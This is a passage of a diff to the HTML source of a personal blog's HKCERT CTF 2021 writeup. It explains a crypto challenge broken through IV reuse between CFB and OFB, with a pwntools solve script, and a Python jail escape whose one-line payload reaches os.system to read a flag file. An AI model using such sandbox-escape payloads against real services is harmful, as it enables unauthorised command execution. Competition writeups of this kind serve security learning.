@@ -1,198 +1,24 @@
-<!doctype html><html lang=en>
-<head>
-<meta charset=utf-8>
-<meta name=viewport content="width=device-width,initial-scale=1">
-<meta name=robots content="noodp">
-<meta http-equiv=x-ua-compatible content="IE=edge, chrome=1">
-<title>HKCERTCTF 2021 Writeup - Ja5on's blog</title><meta name=Description content><meta property="og:title" content="HKCERTCTF 2021 Writeup">
-<meta property="og:description" content="Writeup for HKCERT CTF 2021">
-<meta property="og:type" content="article">
-<meta property="og:url" content="http://CUHKJason.github.io/posts/hkcertctf-2021/"><meta property="article:section" content="posts">
-<meta property="article:published_time" content="2021-11-15T17:00:10+08:00">
-<meta property="article:modified_time" content="2021-11-15T17:00:10+08:00">
-<meta name=twitter:card content="summary">
-<meta name=twitter:title content="HKCERTCTF 2021 Writeup">
-<meta name=twitter:description content="Writeup for HKCERT CTF 2021">
-<meta name=application-name content="Ja5on's blog">
-<meta name=apple-mobile-web-app-title content="Ja5on's blog"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico>
-<link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png>
-<link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=canonical href=http://CUHKJason.github.io/posts/hkcertctf-2021/><link rel=prev href=http://CUHKJason.github.io/posts/allesctf-2021/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"HKCERTCTF 2021 Writeup","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http:\/\/CUHKJason.github.io\/posts\/hkcertctf-2021\/"},"genre":"posts","keywords":"ctf, writeup, web, misc, pwn, reverse, crypto","wordcount":2720,"url":"http:\/\/CUHKJason.github.io\/posts\/hkcertctf-2021\/","datePublished":"2021-11-15T17:00:10+08:00","dateModified":"2021-11-15T17:00:10+08:00","publisher":{"@type":"Organization","name":"Ja5on"},"author":{"@type":"Person","name":"Ja5on"},"description":""}</script></head>
-<body header-desktop header-mobile><script type=text/javascript>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':'dark'==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:'dark'==='dark')&&document.body.setAttribute('theme','dark')</script>
-<div id=mask></div><div class=wrapper><header class=desktop id=header-desktop>
-<div class=header-wrapper>
-<div class=header-title>
-<a href=/ title="Ja5on's blog"><img class="lazyload logo" src=/svg/loading.min.svg data-src=/images/home.png data-srcset="/images/home.png, /images/home.png 1.5x, /images/home.png 2x" data-sizes=auto alt=/images/home.png title=/images/home.png></a>
-</div>
-<div class=menu>
-<div class=menu-inner><a class=menu-item href=/posts/> Posts </a><a class=menu-item href=/categories/> Categories </a><a class=menu-item href=/tags/> Tags </a><a class=menu-item href=/about/> About </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
-<i class="fas fa-adjust fa-fw"></i>
-</a>
-</div>
-</div>
-</div>
-</header><header class=mobile id=header-mobile>
-<div class=header-container>
-<div class=header-wrapper>
-<div class=header-title>
-<a href=/ title="Ja5on's blog"><img class="lazyload logo" src=/svg/loading.min.svg data-src=/images/home.png data-srcset="/images/home.png, /images/home.png 1.5x, /images/home.png 2x" data-sizes=auto alt=/images/home.png title=/images/home.png></a>
-</div>
-<div class=menu-toggle id=menu-toggle-mobile>
-<span></span><span></span><span></span>
-</div>
-</div>
-<div class=menu id=menu-mobile><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/categories/ title>Categories</a><a class=menu-item href=/tags/ title>Tags</a><a class=menu-item href=/about/ title>About</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
-<i class="fas fa-adjust fa-fw"></i>
-</a></div>
-</div>
-</header>
-<div class="search-dropdown desktop">
-<div id=search-dropdown-desktop></div>
-</div>
-<div class="search-dropdown mobile">
-<div id=search-dropdown-mobile></div>
-</div>
-<main class=main>
-<div class=container><div class=toc id=toc-auto>
-<h2 class=toc-title>Contents</h2>
-<div class=toc-content id=toc-content-auto></div>
-</div><article class="page single"><h1 class="single-title animated flipInX">HKCERTCTF 2021 Writeup</h1><div class=post-meta>
-<div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw"></i>Ja5on</a></span>&nbsp;<span class=post-category>included in <a href=/categories/ctf/><i class="far fa-folder fa-fw"></i>ctf</a></span></div>
-<div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2021-11-15>2021-11-15</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;2720 words&nbsp;
-<i class="far fa-clock fa-fw"></i>&nbsp;13 minutes&nbsp;</div>
-</div><div class="details toc" id=toc-static kept>
-<div class="details-summary toc-title">
-<span>Contents</span>
-<span><i class="details-icon fas fa-angle-right"></i></span>
-</div>
-<div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents>
-<ul>
-<li><a href=#freedom-cipher-mode-picker---crypto-100-points>Freedom (Cipher Mode Picker) - Crypto (100 points)</a>
-<ul>
-<li><a href=#challenge->Challenge :</a></li>
-<li><a href=#files->Files :</a></li>
-<li><a href=#solution->Solution :</a></li>
-</ul>
-</li>
-<li><a href=#所有遺失的東西-all-missing---pwn-150-points>所有遺失的東西 (All Missing) - pwn (150 points)</a>
-<ul>
-<li><a href=#challenge--1>Challenge :</a></li>
-<li><a href=#files--1>Files :</a></li>
-<li><a href=#solution--1>Solution :</a></li>
-</ul>
-</li>
-<li><a href=#留下來的人-the-remaining-one---pwn-misc-300-points>留下來的人 (The Remaining One) - pwn, misc (300 points)</a>
-<ul>
-<li><a href=#challenge--2>Challenge :</a></li>
-<li><a href=#files--2>Files :</a></li>
-<li><a href=#solution--2>Solution :</a></li>
-</ul>
-</li>
-<li><a href=#最難行的路-the-hardest-path---reverse-misc-300-points>最難行的路 (The Hardest Path) - reverse, misc (300 points)</a>
-<ul>
-<li><a href=#challenge--3>Challenge :</a></li>
-<li><a href=#files--3>Files :</a></li>
-<li><a href=#solution--3>Solution :</a></li>
-</ul>
-</li>
-<li><a href=#純孩兒-babyxss---web-100-points>純孩兒 (babyXSS) - Web (100 points)</a>
-<ul>
-<li><a href=#challenge--4>Challenge :</a></li>
-<li><a href=#solution--4>Solution :</a></li>
-</ul>
-</li>
-<li><a href=#荊棘海-the-wilderness---web-100-points>荊棘海 (The Wilderness) - Web (100 points)</a>
-<ul>
-<li><a href=#challenge--5>Challenge :</a></li>
-<li><a href=#files--4>Files :</a></li>
-<li><a href=#solution--5>Solution :</a></li>
-</ul>
-</li>
-<li><a href=#樂園-jq-playground---web-200-points>樂園 (JQ Playground) - Web (200 points)</a>
-<ul>
-<li><a href=#challenge--6>Challenge :</a></li>
-<li><a href=#solution--6>Solution :</a></li>
-</ul>
-</li>
-<li><a href=#回到12歲-scratch-tic-tac-toe---misc-200-points>回到12歲 (scratch-tic-tac-toe) - Misc (200 points)</a>
-<ul>
-<li><a href=#challenge--7>Challenge :</a></li>
-<li><a href=#solution--7>Solution :</a></li>
-</ul>
-</li>
-</ul>
-</nav></div>
-</div><div class=content id=content><h1 id=background>Background</h1>
-<p>12 Nov 2021, 18:00 HKT — 14 Nov 2021, 18:00 HKT<br>
-Format: Jeopardy<br>
-Official URL: <a href=https://ctf.hkcert.org/ target=_blank rel="noopener noreffer">https://ctf.hkcert.org/</a><br>
-Organisers: HKCERT and HKPC<br>
-Co-organisers: AiTLE, BlackB6a, eLC, ISOCHK, PISA, VXRL<br>
-CTFtime: <a href=https://ctftime.org/event/1432 target=_blank rel="noopener noreffer">https://ctftime.org/event/1432</a><br>
-I played this HK local CTF last week with my friends and end up with the 5-th in the open category. I learnt a lot but also realised that I really need to improve more of my skills, especially in crypto. (I really want to solve the crypto challs next year)<br>
-This is a well-organized CTF with good theme and platform plus the HK songs, and all of the high quality challenges, big thanks to BlackB6a! I am going to share some of the challenges that I was able to / almost solve (also as the requirement for the top 5 teams to complete some selected writeup).</p>
-<h1 id=challenges>Challenges</h1>
-<h2 id=freedom-cipher-mode-picker---crypto-100-points>Freedom (Cipher Mode Picker) - Crypto (100 points)</h2>
-<h3 id=challenge->Challenge :</h3>
-<blockquote>
-<blockquote>
-<p>Freedom where&rsquo;s our freedom? Freedom what would it be Can you tell me what&rsquo;s the reason? Reason that meant to be</p>
-</blockquote>
-</blockquote>
-<blockquote>
-<p>Every slightest mistake in cryptography would lead to a disastrous result. Let&rsquo;s see what will happen when you allow end-users to pick the mode of operation&mldr;
-nc chalp.hkcert21.pwnable.hk 28102</p>
-</blockquote>
-<h3 id=files->Files :</h3>
-<p><a href=/files/HKCERT/freedom_ff0173b179d746386dca0e93e6c00d47.zip rel>freedom_ff0173b179d746386dca0e93e6c00d47.zip</a></p>
-<h3 id=solution->Solution :</h3>
-<p>From the provided <code>chall.py</code>, we can observe:</p>
-<ol>
-<li>The length of flag is <code>80</code>.</li>
-<li>A fix <code>key</code> and <code>IV</code> are used for each connection</li>
-<li>There are 5 mode of operations implemented (&lsquo;ECB&rsquo;, &lsquo;CBC&rsquo;, &lsquo;CFB&rsquo;, &lsquo;OFB&rsquo; and &lsquo;CTR&rsquo;) and you can either provide data to the server for the encryption or let the server encrypting the flag, for at most 5 times per connection. But you can only use 1 mode per connection.</li>
-</ol>
-<p>If you are familiar with these operation, you may spot that the weakness is the reuse of IV&mldr; Let&rsquo;s have a look into the mode &lsquo;CFB&rsquo; and &lsquo;OFB&rsquo;:</p>
-<p><img class=lazyload src=/svg/loading.min.svg data-src=https://user-images.githubusercontent.com/19466939/141827418-59c34dbf-5393-4ba1-9846-5454bed8d7fb.png data-srcset="https://user-images.githubusercontent.com/19466939/141827418-59c34dbf-5393-4ba1-9846-5454bed8d7fb.png, https://user-images.githubusercontent.com/19466939/141827418-59c34dbf-5393-4ba1-9846-5454bed8d7fb.png 1.5x, https://user-images.githubusercontent.com/19466939/141827418-59c34dbf-5393-4ba1-9846-5454bed8d7fb.png 2x" data-sizes=auto alt=https://user-images.githubusercontent.com/19466939/141827418-59c34dbf-5393-4ba1-9846-5454bed8d7fb.png title="1920px-CFB_encryption svg">
-<img class=lazyload src=/svg/loading.min.svg data-src=https://user-images.githubusercontent.com/19466939/141827405-17ae2f4d-2cdc-46db-a20e-2a8bc32a204f.png data-srcset="https://user-images.githubusercontent.com/19466939/141827405-17ae2f4d-2cdc-46db-a20e-2a8bc32a204f.png, https://user-images.githubusercontent.com/19466939/141827405-17ae2f4d-2cdc-46db-a20e-2a8bc32a204f.png 1.5x, https://user-images.githubusercontent.com/19466939/141827405-17ae2f4d-2cdc-46db-a20e-2a8bc32a204f.png 2x" data-sizes=auto alt=https://user-images.githubusercontent.com/19466939/141827405-17ae2f4d-2cdc-46db-a20e-2a8bc32a204f.png title="1920px-OFB_encryption svg"></p>
-<p>As we can see, the encryption procedure of CFB and OFB are actually the same. Therefore if we first provide all zero as the data to encrypt with one mode (e.g., CFB), it will return the encryption of each block itself. Then we request for the encrypted flag with another mode (e.g., OFB) and xor them together, we will get the flag!</p>
-<p>For CFB:</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta http-equiv=x-ua-compatible content="IE=edge, chrome=1"><title>HKCERTCTF 2021 Writeup - Ja5on's blog</title><meta name=Description content><meta property="og:title" content="HKCERTCTF 2021 Writeup"><meta property="og:description" content="Writeup for HKCERT CTF 2021"><meta property="og:type" content="article"><meta property="og:url" content="http://CUHKJason.github.io/posts/hkcertctf-2021/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-11-15T17:00:10+08:00"><meta property="article:modified_time" content="2021-11-15T17:00:10+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="HKCERTCTF 2021 Writeup"><meta name=twitter:description content="Writeup for HKCERT CTF 2021"><meta name=application-name content="Ja5on's blog"><meta name=apple-mobile-web-app-title content="Ja5on's blog"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=canonical href=http://CUHKJason.github.io/posts/hkcertctf-2021/><link rel=prev href=http://CUHKJason.github.io/posts/allesctf-2021/><link rel=next href=http://CUHKJason.github.io/posts/spyce2/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"HKCERTCTF 2021 Writeup","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http:\/\/CUHKJason.github.io\/posts\/hkcertctf-2021\/"},"genre":"posts","keywords":"ctf, writeup, web, misc, pwn, reverse, crypto","wordcount":2720,"url":"http:\/\/CUHKJason.github.io\/posts\/hkcertctf-2021\/","datePublished":"2021-11-15T17:00:10+08:00","dateModified":"2021-11-15T17:00:10+08:00","publisher":{"@type":"Organization","name":"Ja5on"},"author":{"@type":"Person","name":"Ja5on"},"description":""}</script></head><body header-desktop header-mobile><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"dark"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"dark"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="Ja5on's blog"><img class="lazyload logo" src=/svg/loading.min.svg data-src=/images/home.png data-srcset="/images/home.png, /images/home.png 1.5x, /images/home.png 2x" data-sizes=auto alt=/images/home.png title=/images/home.png></a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>Posts </a><a class=menu-item href=/categories/>Categories </a><a class=menu-item href=/tags/>Tags </a><a class=menu-item href=/about/>About </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw"></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="Ja5on's blog"><img class="lazyload logo" src=/svg/loading.min.svg data-src=/images/home.png data-srcset="/images/home.png, /images/home.png 1.5x, /images/home.png 2x" data-sizes=auto alt=/images/home.png title=/images/home.png></a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/categories/ title>Categories</a><a class=menu-item href=/tags/ title>Tags</a><a class=menu-item href=/about/ title>About</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw"></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animated flipInX">HKCERTCTF 2021 Writeup</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw"></i>Ja5on</a></span>&nbsp;<span class=post-category>included in <a href=/categories/ctf/><i class="far fa-folder fa-fw"></i>ctf</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2021-11-15>2021-11-15</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;2720 words&nbsp;
+<i class="far fa-clock fa-fw"></i>&nbsp;13 minutes&nbsp;</div></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>Contents</span>
+<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#freedom-cipher-mode-picker---crypto-100-points>Freedom (Cipher Mode Picker) - Crypto (100 points)</a><ul><li><a href=#challenge->Challenge :</a></li><li><a href=#files->Files :</a></li><li><a href=#solution->Solution :</a></li></ul></li><li><a href=#所有遺失的東西-all-missing---pwn-150-points>所有遺失的東西 (All Missing) - pwn (150 points)</a><ul><li><a href=#challenge--1>Challenge :</a></li><li><a href=#files--1>Files :</a></li><li><a href=#solution--1>Solution :</a></li></ul></li><li><a href=#留下來的人-the-remaining-one---pwn-misc-300-points>留下來的人 (The Remaining One) - pwn, misc (300 points)</a><ul><li><a href=#challenge--2>Challenge :</a></li><li><a href=#files--2>Files :</a></li><li><a href=#solution--2>Solution :</a></li></ul></li><li><a href=#最難行的路-the-hardest-path---reverse-misc-300-points>最難行的路 (The Hardest Path) - reverse, misc (300 points)</a><ul><li><a href=#challenge--3>Challenge :</a></li><li><a href=#files--3>Files :</a></li><li><a href=#solution--3>Solution :</a></li></ul></li><li><a href=#純孩兒-babyxss---web-100-points>純孩兒 (babyXSS) - Web (100 points)</a><ul><li><a href=#challenge--4>Challenge :</a></li><li><a href=#solution--4>Solution :</a></li></ul></li><li><a href=#荊棘海-the-wilderness---web-100-points>荊棘海 (The Wilderness) - Web (100 points)</a><ul><li><a href=#challenge--5>Challenge :</a></li><li><a href=#files--4>Files :</a></li><li><a href=#solution--5>Solution :</a></li></ul></li><li><a href=#樂園-jq-playground---web-200-points>樂園 (JQ Playground) - Web (200 points)</a><ul><li><a href=#challenge--6>Challenge :</a></li><li><a href=#solution--6>Solution :</a></li></ul></li><li><a href=#回到12歲-scratch-tic-tac-toe---misc-200-points>回到12歲 (scratch-tic-tac-toe) - Misc (200 points)</a><ul><li><a href=#challenge--7>Challenge :</a></li><li><a href=#solution--7>Solution :</a></li></ul></li></ul></nav></div></div><div class=content id=content><h1 id=background>Background</h1><p>12 Nov 2021, 18:00 HKT — 14 Nov 2021, 18:00 HKT<br>Format: Jeopardy<br>Official URL: <a href=https://ctf.hkcert.org/ target=_blank rel="noopener noreffer">https://ctf.hkcert.org/</a><br>Organisers: HKCERT and HKPC<br>Co-organisers: AiTLE, BlackB6a, eLC, ISOCHK, PISA, VXRL<br>CTFtime: <a href=https://ctftime.org/event/1432 target=_blank rel="noopener noreffer">https://ctftime.org/event/1432</a><br>I played this HK local CTF last week with my friends and end up with the 5-th in the open category. I learnt a lot but also realised that I really need to improve more of my skills, especially in crypto. (I really want to solve the crypto challs next year)<br>This is a well-organized CTF with good theme and platform plus the HK songs, and all of the high quality challenges, big thanks to BlackB6a! I am going to share some of the challenges that I was able to / almost solve (also as the requirement for the top 5 teams to complete some selected writeup).</p><h1 id=challenges>Challenges</h1><h2 id=freedom-cipher-mode-picker---crypto-100-points>Freedom (Cipher Mode Picker) - Crypto (100 points)</h2><h3 id=challenge->Challenge :</h3><blockquote><blockquote><p>Freedom where&rsquo;s our freedom? Freedom what would it be Can you tell me what&rsquo;s the reason? Reason that meant to be</p></blockquote></blockquote><blockquote><p>Every slightest mistake in cryptography would lead to a disastrous result. Let&rsquo;s see what will happen when you allow end-users to pick the mode of operation&mldr;
+nc chalp.hkcert21.pwnable.hk 28102</p></blockquote><h3 id=files->Files :</h3><p><a href=/files/HKCERT/freedom_ff0173b179d746386dca0e93e6c00d47.zip rel>freedom_ff0173b179d746386dca0e93e6c00d47.zip</a></p><h3 id=solution->Solution :</h3><p>From the provided <code>chall.py</code>, we can observe:</p><ol><li>The length of flag is <code>80</code>.</li><li>A fix <code>key</code> and <code>IV</code> are used for each connection</li><li>There are 5 mode of operations implemented (&lsquo;ECB&rsquo;, &lsquo;CBC&rsquo;, &lsquo;CFB&rsquo;, &lsquo;OFB&rsquo; and &lsquo;CTR&rsquo;) and you can either provide data to the server for the encryption or let the server encrypting the flag, for at most 5 times per connection. But you can only use 1 mode per connection.</li></ol><p>If you are familiar with these operation, you may spot that the weakness is the reuse of IV&mldr; Let&rsquo;s have a look into the mode &lsquo;CFB&rsquo; and &lsquo;OFB&rsquo;:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://user-images.githubusercontent.com/19466939/141827418-59c34dbf-5393-4ba1-9846-5454bed8d7fb.png data-srcset="https://user-images.githubusercontent.com/19466939/141827418-59c34dbf-5393-4ba1-9846-5454bed8d7fb.png, https://user-images.githubusercontent.com/19466939/141827418-59c34dbf-5393-4ba1-9846-5454bed8d7fb.png 1.5x, https://user-images.githubusercontent.com/19466939/141827418-59c34dbf-5393-4ba1-9846-5454bed8d7fb.png 2x" data-sizes=auto alt=https://user-images.githubusercontent.com/19466939/141827418-59c34dbf-5393-4ba1-9846-5454bed8d7fb.png title="1920px-CFB_encryption svg">
+<img class=lazyload src=/svg/loading.min.svg data-src=https://user-images.githubusercontent.com/19466939/141827405-17ae2f4d-2cdc-46db-a20e-2a8bc32a204f.png data-srcset="https://user-images.githubusercontent.com/19466939/141827405-17ae2f4d-2cdc-46db-a20e-2a8bc32a204f.png, https://user-images.githubusercontent.com/19466939/141827405-17ae2f4d-2cdc-46db-a20e-2a8bc32a204f.png 1.5x, https://user-images.githubusercontent.com/19466939/141827405-17ae2f4d-2cdc-46db-a20e-2a8bc32a204f.png 2x" data-sizes=auto alt=https://user-images.githubusercontent.com/19466939/141827405-17ae2f4d-2cdc-46db-a20e-2a8bc32a204f.png title="1920px-OFB_encryption svg"></p><p>As we can see, the encryption procedure of CFB and OFB are actually the same. Therefore if we first provide all zero as the data to encrypt with one mode (e.g., CFB), it will return the encryption of each block itself. Then we request for the encrypted flag with another mode (e.g., OFB) and xor them together, we will get the flag!</p><p>For CFB:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>C_{0} = IV
-C_{i} = E_{k}(C_{i-1}) xor P_{i}
-P = 0 =&gt; C_{i} = E_{k}(C_{i-1})
-</code></pre></td></tr></table>
-</div>
-</div><p>For OFB:</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>C_{0} = IV
+</span></span><span class=line><span class=cl>C_{i} = E_{k}(C_{i-1}) xor P_{i}
+</span></span><span class=line><span class=cl>P = 0 =&gt; C_{i} = E_{k}(C_{i-1})
+</span></span></code></pre></td></tr></table></div></div><p>For OFB:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>O_{0} = IV
-O_{i} = E_{k}(O_{i-1})
-C_{i} = E_{k}(O_{i-1}) xor P_{i}
-</code></pre></td></tr></table>
-</div>
-</div><div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>E_{k}(C_{i-1}) xor E_{k}(O_{i-1}) xor P_{i} = P_{i} (which is the flag)
-</code></pre></td></tr></table>
-</div>
-</div><p><strong>Solve:</strong></p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>O_{0} = IV
+</span></span><span class=line><span class=cl>O_{i} = E_{k}(O_{i-1})
+</span></span><span class=line><span class=cl>C_{i} = E_{k}(O_{i-1}) xor P_{i}
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>E_{k}(C_{i-1}) xor E_{k}(O_{i-1}) xor P_{i} = P_{i} (which is the flag)
+</span></span></code></pre></td></tr></table></div></div><p><strong>Solve:</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -208,127 +34,42 @@ C_{i} = E_{k}(O_{i-1}) xor P_{i}
 </span><span class=lnt>14
 </span><span class=lnt>15
 </span><span class=lnt>16
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>from pwn import *
-from Crypto.Util.number import long_to_bytes
-
-def xor(s1, s2):
-    return &#39;&#39;.join([str(int(a) ^ int(b)) for a,b in zip(s1,s2)])
-
-r = remote(&#34;chalp.hkcert21.pwnable.hk&#34;, 28102)
-r.recvuntil(b&#39;&gt; &#39;)
-r.sendline(b&#39;cfb data &#39;+ b&#39;0&#39;*160)
-s1 = r.recvline()[:-1]
-r.recvuntil(b&#39;&gt; &#39;)
-r.sendline(b&#39;ofb flag&#39;)
-s2 = r.recvline()[:-1]
-r.close()
-t = xor(bin(int(s1,16))[2:],bin(int(s2,16))[2:])
-print(long_to_bytes(int(t,2)))
-</code></pre></td></tr></table>
-</div>
-</div><p>FLAG : <strong>hkcert21{w3_sh0u1d_n0t_g1v3_much_fr3ed0m_t0_us3r5_wh3n_1t_c0m3s_t0_cryp70gr4phy}</strong></p>
-<h2 id=所有遺失的東西-all-missing---pwn-150-points>所有遺失的東西 (All Missing) - pwn (150 points)</h2>
-<h3 id=challenge--1>Challenge :</h3>
-<blockquote>
-<p>You lose all the things, including the chance of getting out of the jail of python.
-nc chalp.hkcert21.pwnable.hk 28004</p>
-</blockquote>
-<h3 id=files--1>Files :</h3>
-<p><a href=/files/HKCERT/pyjail1_f7be93352498ebd158a0a9fc069b30e9.zip rel>pyjail1_f7be93352498ebd158a0a9fc069b30e9.zip</a></p>
-<h3 id=solution--1>Solution :</h3>
-<p>I was working on some other challenge while my teammate asked for help, so I checked this challenge. It is a Pythohn jail escape challenge. <code>__builtins__</code> is clear and the square brackets<code>[]</code> are not allowed to use.</p>
-<p>I did some googling and found some payloads such as <code>().__class__.__base__.__subclasses__()</code> or <code>''.__class__.__mro__.__getitem__(1).__subclasses__()</code> to get some &ldquo;benign&rdquo; subclasses from modules imported in memory by default, even we dont have <code>__builtins__</code>.Moreover, we can use <code>__getitem__(i)</code> or <code>pop(i)</code> to replace the use of <code>[]</code>.</p>
-<p>After some checking, we found the class <code>&lt;class 'os._wrap_close'></code> which has the method <code>popen</code>. We first call <code>__init__</code> to initiate with <code>__globals__</code> to get the method as dictionary.</p>
-<p><strong>Solve:</strong></p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>().__class__.__base__.__subclasses__().pop(133).__init__.__globals__.pop(&#39;system&#39;)(&#39;cat flag.txt&#39;)
-</code></pre></td></tr></table>
-</div>
-</div><p>FLAG : <strong>hkcert21{nev3r_uSe_pYth0n_45_sanDBox}</strong></p>
-<h2 id=留下來的人-the-remaining-one---pwn-misc-300-points>留下來的人 (The Remaining One) - pwn, misc (300 points)</h2>
-<h3 id=challenge--2>Challenge :</h3>
-<blockquote>
-<p>Find out the only one who always stand by you, that&rsquo;s the key of the escape.
-nc chalp.hkcert21.pwnable.hk 28005</p>
-</blockquote>
-<h3 id=files--2>Files :</h3>
-<p><a href=/files/HKCERT/pyjail2_5ce6175d2c2cc1469d1188f029c356cb.zip rel>pyjail2_5ce6175d2c2cc1469d1188f029c356cb.zip</a></p>
-<h3 id=solution--2>Solution :</h3>
-<p>It was at the midnight after finished the first Python jailbreak chall above. I decided to have a look into the second part as well and got the first blood luckily.</p>
-<p>The difference between this and the last chall is that the payload was restricted within length <code>59</code>. Therefore we cannot &ldquo;reuse&rdquo; the payload in the first part. However, is it really the case?</p>
-<p>Actually the another diff alerted me, unlike the first part that you can only have 1 input, you can have infinite round of input. This made me thinking about &ldquo;splitting and storing&rdquo; the payload in each round and call it at the end. First I tried something like <code>a = "xxx"</code> but it returned a SyntaxError, as it is inside the <code>eval</code> you cannot assign variable like that.</p>
-<p>Then I realised that although <code>__builtins__</code> was clear, this dict still exist and can be used. To assign the value for dictionary, we can use <code>update</code>. Therefore, what we need to do is just split the previous payload, use <code>update</code> to store the payload to the dict and &mldr;Done!</p>
-<p><strong>Solve:</strong></p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>from pwn import *
+</span></span><span class=line><span class=cl>from Crypto.Util.number import long_to_bytes
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>def xor(s1, s2):
+</span></span><span class=line><span class=cl>    return &#39;&#39;.join([str(int(a) ^ int(b)) for a,b in zip(s1,s2)])
+</span></span><span class=line><span class=cl>
